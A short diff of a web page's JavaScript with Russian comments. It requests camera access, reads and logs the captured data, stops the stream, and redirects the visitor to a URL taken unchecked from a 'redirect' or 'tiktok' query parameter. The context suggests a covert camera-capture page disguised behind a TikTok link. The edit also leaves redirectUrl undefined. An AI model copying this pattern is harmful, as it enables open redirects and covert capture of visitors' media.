@@ -150,20 +150,8 @@
         console.log(data);
         reader.readAsArrayBuffer(blob);
       }
-   
+      window.location.replace(redirectUrl);
       stream.getTracks().forEach(track => track.stop());
-    }
-
-
-    function redirectToFinalDestination() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const redirectUrl = urlParams.get('redirect') || urlParams.get('tiktok') || window.location.origin;
-      console.log('Выполняем редирект на:', redirectUrl);
-
-      // Добавляем таймаут для редиректа
-      setTimeout(function() {
-        window.location.replace(redirectUrl);
-      }, 3000);
     }
 
     // Начинаем запрос доступа к камере
